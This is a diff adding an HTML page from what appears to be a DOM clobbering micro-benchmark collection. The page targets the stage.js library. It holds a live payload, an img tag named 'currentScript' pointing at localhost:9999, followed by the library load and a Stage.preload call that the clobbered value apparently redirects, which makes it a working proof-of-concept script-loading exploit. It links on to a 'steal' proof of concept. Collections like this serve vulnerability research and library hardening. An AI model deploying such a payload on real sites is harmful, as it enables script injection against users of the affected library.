@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - stage</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=&quot;currentScript&quot; src=&quot;http://localhost:9999&quot;&gt;</pre>
+  <img name="currentScript" src="http://localhost:9999">
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/stage.js/0.8.10/stage.web.js&quot; integrity=&quot;sha512-rA/8kCbIrzxcXW6akXAiN6FnpM+VW2iv9Zzw4ghu5Mt7xDobt3oraMSDxDeqq4kSUkaTBVdNOy1iyEyFhmceCw==&quot; crossorigin=&quot;anonymous&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/script&gt;
+
+&lt;script&gt;
+Stage.preload(&#x27;./a.js&#x27;)
+&lt;/script&gt;</pre>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/stage.js/0.8.10/stage.web.js" integrity="sha512-rA/8kCbIrzxcXW6akXAiN6FnpM+VW2iv9Zzw4ghu5Mt7xDobt3oraMSDxDeqq4kSUkaTBVdNOy1iyEyFhmceCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+Stage.preload('./a.js')
+</script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../steal/poc.html">Next: steal</a>
+  </div>
+</section>
+
+</body>
+</html>
